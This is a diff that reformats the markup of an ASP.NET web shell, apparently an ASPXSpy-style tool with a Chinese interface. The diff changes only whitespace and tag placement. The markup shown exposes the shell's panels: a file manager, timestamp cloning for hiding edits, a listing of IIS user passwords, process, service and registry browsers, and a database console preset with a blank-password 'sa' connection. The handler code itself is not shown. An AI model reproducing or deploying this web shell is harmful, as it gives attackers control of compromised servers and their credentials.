@@ -1,4 +1,4 @@
-<%@ Page Language="C#" Debug="true" Trace="false" ValidateRequest="false" EnableViewStateMac="false" EnableViewState="true" %>
+﻿<%@ Page Language="C#" Debug="true" Trace="false" ValidateRequest="false" EnableViewStateMac="false" EnableViewState="true" %>
 
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Diagnostics" %>
@@ -2536,7 +2536,8 @@ E-mail : master@2ba.in
                                 </tr>
                                 <asp:Table ID="UGzP" runat="server" Width="100%" CellSpacing="0">
                                     <asp:TableRow CssClass="head">
-                                        <asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>文件名</asp:TableCell><asp:TableCell Width="25%">最后修改</asp:TableCell><asp:TableCell Width="15%">大小</asp:TableCell><asp:TableCell Width="25%">动作</asp:TableCell></asp:TableRow>
+                                        <asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>文件名</asp:TableCell><asp:TableCell Width="25%">最后修改</asp:TableCell><asp:TableCell Width="15%">大小</asp:TableCell><asp:TableCell Width="25%">动作</asp:TableCell>
+                                    </asp:TableRow>
                                 </asp:Table>
                             </table>
                         </div>
@@ -2556,19 +2557,27 @@ E-mail : master@2ba.in
                             </p>
                             <p>
                                 <asp:Button ID="JJjbW" runat="server" Text="Submit" CssClass="bt" OnClick="DGCoW" />
-                                <asp:Button ID="iCNu" runat="server" Text="Back" CssClass="bt" OnClick="IkkO" /></p>
+                                <asp:Button ID="iCNu" runat="server" Text="Back" CssClass="bt" OnClick="IkkO" />
+                            </p>
                         </div>
                         <%--CloneTime--%>
                         <div id="zRyG" runat="server" enableviewstate="false" visible="false">
-                            <p>修改文件<br />
-                                <input class="input" id="QiFB" type="text" size="120" runat="server" /></p>
-                            <p>参考文件(fullpath)<br />
-                                <input class="input" id="lICp" type="text" size="120" runat="server" /></p>
                             <p>
-                                <asp:Button ID="JEaxV" runat="server" Text="Submit" CssClass="bt" OnClick="XXrLw" /></p>
+                                修改文件<br />
+                                <input class="input" id="QiFB" type="text" size="120" runat="server" />
+                            </p>
+                            <p>
+                                参考文件(fullpath)<br />
+                                <input class="input" id="lICp" type="text" size="120" runat="server" />
+                            </p>
+                            <p>
+                                <asp:Button ID="JEaxV" runat="server" Text="Submit" CssClass="bt" OnClick="XXrLw" />
+                            </p>
                             <h2>最后修改设置 &raquo;</h2>
-                            <p>当前文件(fullpath)<br />
-                                <input class="input" id="pWVL" type="text" size="120" runat="server" /></p>
+                            <p>
+                                当前文件(fullpath)<br />
+                                <input class="input" id="pWVL" type="text" size="120" runat="server" />
+                            </p>
                             <p>
                                 <asp:CheckBox ID="ZhWSK" runat="server" Text="只读" EnableViewState="False" />
                                 &nbsp;
@@ -2595,7 +2604,8 @@ E-mail : master@2ba.in
                             <table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin: 10px 0;">
                                 <asp:Table ID="GlI" runat="server" Width="100%" CellSpacing="0">
                                     <asp:TableRow CssClass="head">
-                                        <asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_用户</asp:TableCell><asp:TableCell>IIS_密码</asp:TableCell><asp:TableCell>域名</asp:TableCell><asp:TableCell>路径</asp:TableCell></asp:TableRow>
+                                        <asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_用户</asp:TableCell><asp:TableCell>IIS_密码</asp:TableCell><asp:TableCell>域名</asp:TableCell><asp:TableCell>路径</asp:TableCell>
+                                    </asp:TableRow>
                                 </asp:Table>
                             </table>
                         </div>
@@ -2604,7 +2614,8 @@ E-mail : master@2ba.in
                             <table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin: 10px 0;">
                                 <asp:Table ID="IjsL" runat="server" Width="100%" CellSpacing="0">
                                     <asp:TableRow CssClass="head">
-                                        <asp:TableCell></asp:TableCell><asp:TableCell>编号</asp:TableCell><asp:TableCell>进程</asp:TableCell><asp:TableCell>ThreadCount</asp:TableCell><asp:TableCell>优先</asp:TableCell><asp:TableCell>动作</asp:TableCell></asp:TableRow>
+                                        <asp:TableCell></asp:TableCell><asp:TableCell>编号</asp:TableCell><asp:TableCell>进程</asp:TableCell><asp:TableCell>ThreadCount</asp:TableCell><asp:TableCell>优先</asp:TableCell><asp:TableCell>动作</asp:TableCell>
+                                    </asp:TableRow>
                                 </asp:Table>
                             </table>
                         </div>
@@ -2625,7 +2636,8 @@ E-mail : master@2ba.in
                             <table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin: 10px 0;">
                                 <asp:Table ID="vHCs" runat="server" Width="100%" CellSpacing="0">
                                     <asp:TableRow CssClass="head">
-                                        <asp:TableCell></asp:TableCell><asp:TableCell>编号</asp:TableCell><asp:TableCell>名称</asp:TableCell><asp:TableCell>路径</asp:TableCell><asp:TableCell>状况</asp:TableCell><asp:TableCell>启动模式</asp:TableCell></asp:TableRow>
+                                        <asp:TableCell></asp:TableCell><asp:TableCell>编号</asp:TableCell><asp:TableCell>名称</asp:TableCell><asp:TableCell>路径</asp:TableCell><asp:TableCell>状况</asp:TableCell><asp:TableCell>启动模式</asp:TableCell>
+                                    </asp:TableRow>
                                 </asp:Table>
                             </table>
                         </div>
@@ -2680,14 +2692,18 @@ E-mail : master@2ba.in
                         </div>
                         <%--Reg--%>
                         <div id="kkHN" runat="server">
-                            <p>注册表路径 :
-                                <asp:TextBox ID="qPdI" Style="width: 85%; margin: 0 8px;" CssClass="input" runat="server" /><asp:Button ID="MoNA" runat="server" Text="Go" CssClass="bt" OnClick="RAFL" /></p>
+                            <p>
+                                注册表路径 :
+                                <asp:TextBox ID="qPdI" Style="width: 85%; margin: 0 8px;" CssClass="input" runat="server" /><asp:Button ID="MoNA" runat="server" Text="Go" CssClass="bt" OnClick="RAFL" />
+                            </p>
                             <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin: 10px 0;">
                                 <asp:Table ID="pLWD" runat="server" Width="100%" CellSpacing="0">
                                     <asp:TableRow CssClass="alt1">
-                                        <asp:TableCell ColumnSpan="2" ID="vyX"></asp:TableCell></asp:TableRow>
+                                        <asp:TableCell ColumnSpan="2" ID="vyX"></asp:TableCell>
+                                    </asp:TableRow>
                                     <asp:TableRow CssClass="head">
-                                        <asp:TableCell Width="40%">Key</asp:TableCell><asp:TableCell Width="60%">值</asp:TableCell></asp:TableRow>
+                                        <asp:TableCell Width="40%">Key</asp:TableCell><asp:TableCell Width="60%">值</asp:TableCell>
+                                    </asp:TableRow>
                                 </asp:Table>
                             </table>
                         </div>
@@ -2704,12 +2720,14 @@ E-mail : master@2ba.in
                         </div>
                         <%--DataBase--%>
                         <div id="iDgmL" runat="server">
-                            <p>ConnString :
+                            <p>
+                                ConnString :
                                 <asp:TextBox ID="MasR" Style="width: 70%; margin: 0 8px;" CssClass="input" runat="server" /><asp:DropDownList runat="server" CssClass="list" ID="WYmo" AutoPostBack="True" OnSelectedIndexChanged="zOVO">
                                     <asp:ListItem></asp:ListItem>
                                     <asp:ListItem Value="server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB">MSSQL</asp:ListItem>
                                     <asp:ListItem Value="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\database.mdb">ACCESS</asp:ListItem>
-                                </asp:DropDownList><asp:Button ID="QcZPA" runat="server" Text="Go" CssClass="bt" OnClick="BGY" /></p>
+                                </asp:DropDownList><asp:Button ID="QcZPA" runat="server" Text="Go" CssClass="bt" OnClick="BGY" />
+                            </p>
                             <div id="dQIIF" runat="server">
                                 <div id="irTU" runat="server"></div>
                                 <div id="uXevN" runat="server">
@@ -2817,7 +2835,8 @@ E-mail : master@2ba.in
                             <br />
                             <asp:Table ID="oJiym" runat="server" Width="100%" CellSpacing="0">
                                 <asp:TableRow CssClass="head">
-                                    <asp:TableCell Width="60%">File Path</asp:TableCell><asp:TableCell Width="20%">Last modified</asp:TableCell><asp:TableCell Width="20%">Size</asp:TableCell></asp:TableRow>
+                                    <asp:TableCell Width="60%">File Path</asp:TableCell><asp:TableCell Width="20%">Last modified</asp:TableCell><asp:TableCell Width="20%">Size</asp:TableCell>
+                                </asp:TableRow>
                             </asp:Table>
                         </div>
                     </td>
